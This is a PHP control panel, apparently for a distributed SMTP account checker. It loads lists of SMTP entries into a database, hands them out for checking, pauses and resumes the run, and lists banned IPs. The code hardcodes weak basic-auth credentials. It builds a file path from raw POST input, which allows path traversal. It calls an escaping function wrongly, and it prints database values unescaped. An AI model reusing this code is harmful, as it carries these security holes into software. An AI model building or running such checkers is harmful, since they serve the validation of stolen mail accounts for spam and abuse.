<?php

if($_SERVER['PHP_AUTH_USER'] != 'iroot' || $_SERVER['PHP_AUTH_PW'] != 'pass777')
{
	header('WWW-Authenticate: Basic realm="My Realm"');
	header('HTTP/1.0 401 Unauthorized');
	die('.');
}

include_once("../db.php");

if(isset($_POST['Button1']))
{
	mysqli_query($con, "UPDATE checker SET sent=0");
	header("Location: control.php");
	exit;
}
if(isset($_POST['Stop']))
{
	file_put_contents("stoped.txt", "");
	header("Location: control.php");
	exit;
}
if(isset($_POST['Play']))
{
	@unlink("stoped.txt");
	header("Location: control.php");
	exit;
}
if(isset($_POST['cleantstats']))
{
	mysqli_query($con, "UPDATE checker SET status=0");
	header("Location: control.php");
	exit;
}
if(isset($_POST['checktime']))
{
	$date = time();
	$limit = $date-10*60;
	mysqli_query($con, "UPDATE checker SET status=0,hour=0 WHERE hour < $limit");
	header("Location: control.php");
	exit;
}
if(isset($_POST['Button2']))
{
	mysqli_query($con, "TRUNCATE TABLE checker");
	header("Location: control.php");
	exit;
}
if(isset($_POST['Cleanban']))
{
	mysqli_query($con, "TRUNCATE TABLE logx");
	header("Location: control.php");
	exit;
}
if(isset($_POST['loadfile']) && isset($_POST['list']))
{
	$list = './smtps/'.$_POST['list']; 
	if(!file_exists($list)) die("File not exists");
	$info = file_get_contents($list);
	$info = explode("\n", str_replace("\r","",$info));
	//die(count($info));
	for($i = 0; $i < count($info); $i++)
	{
		$ss = mysqli_real_escape_string($con, $info[$i]);
		mysqli_query($con, "INSERT INTO checker (smtp) VALUES ('".$ss."')");
	}
	header("Location: control.php");
	exit;
}
if(isset($_POST['Button3']))
{
	$info = $_POST['TextArea1'];
	$info = explode("\n", str_replace("\r","",$info))	;
	for($i = 0; $i < count($info); $i++)
	{
		$ss = mysqli_real_escape_string($info[$i]);
		$q = mysqli_query($con, "SELECT * FROM checker WHERE smtp='".$ss."' LIMIT 1");
		if(mysqli_num_rows($q) == 0)
		{
			mysqli_query($con, "INSERT INTO checker (smtp) VALUES ('".$ss."')");
		}
	}
	header("Location: control.php");
	exit;
}


$result = mysqli_query($con, "SELECT COUNT(1) FROM checker");
$row = mysqli_fetch_array($result);
$total = $row[0];

$result = mysqli_query($con, "SELECT COUNT(1) FROM checker WHERE status = 1");
$row = mysqli_fetch_array($result);
$totalgived = $row[0];

$result = mysqli_query($con, "SELECT COUNT(1) FROM checker WHERE status = 2");
$row = mysqli_fetch_array($result);
$totalchecked = $row[0];

$result = mysqli_query($con, "SELECT * FROM logx_checker");

$row = mysqli_fetch_array($result);
$totalbans = $row[0];
//$totalbans = mysqli_num_rows( $result);


// $result = mysqli_query($con, "SELECT COUNT(1) FROM checker WHERE sent=1");
// $row = mysqli_fetch_array($result);
// $checked = $row[0];
$checked = '';

// $result = mysqli_query($con, "SELECT COUNT(1) FROM checker WHERE sent=0");
// $row = mysqli_fetch_array($result);
// $unchecked = $row[0];
$unchecked = '';

?>

<html>

<head>
<title>Checking</title>
</head>
<body>
<?php include("../head.php"); ?>
<form id="form1" action="" method="post">

	<input name="Button1" type="submit" value="Reset" /> 
	<input name="Button2" type="submit" value="Truncate" />
	<input name="cleantstats" type="submit" value="Clean stats" />
	<input name="checktime" type="submit" value="Check time" />
	<select name="list">
	<?php
		if ($handle = opendir('./smtps/')) {
			while (false !== ($entry = readdir($handle))) {
				if ($entry != "." && $entry != ".." && $entry != ".htaccess"){
					echo "<option value=\"$entry\">$entry</option>\n";
				}
			}
			closedir($handle);
		}
  		?>
	</select>
	<input name="loadfile" type="submit" value="Load data from file" />
	<input name="Cleanban" type="submit" value="Clean Ban" />	
	<?php
		if(file_exists('stoped.txt'))
		{
			echo '<input name="Play" type="submit" value="PLAY !" />';
		}else{
			echo '<input name="Stop" type="submit" value="Stop" />';
		}
	?>
</form><hr /><br />	
<?php echo "Title: <b>CHECKING</b><br>Total: $total <br>Giveds: $totalgived<br>Checkeds: $totalchecked<br>"; ?>
<?php
		if(file_exists('stoped.txt'))
		{
			echo "Status: <font color=red><b>Stoped</b></font><br>";
		}else{
			echo "Status: <font color=limegreen><b>Play</b></font><br>";
		}
?>
<?php echo "Total IPs checkings: ".$totalbans."<br>Banneds:<br>"; 

while ($row = mysqli_fetch_assoc( $result)) {
	$counterlog = $row["counterlog"];
	if($counterlog >= 3)
	{
		echo $row["ip"]." | ".$row["timelog"]." | ".$counterlog." <br>";
	}
}
?>
</body>
</html>
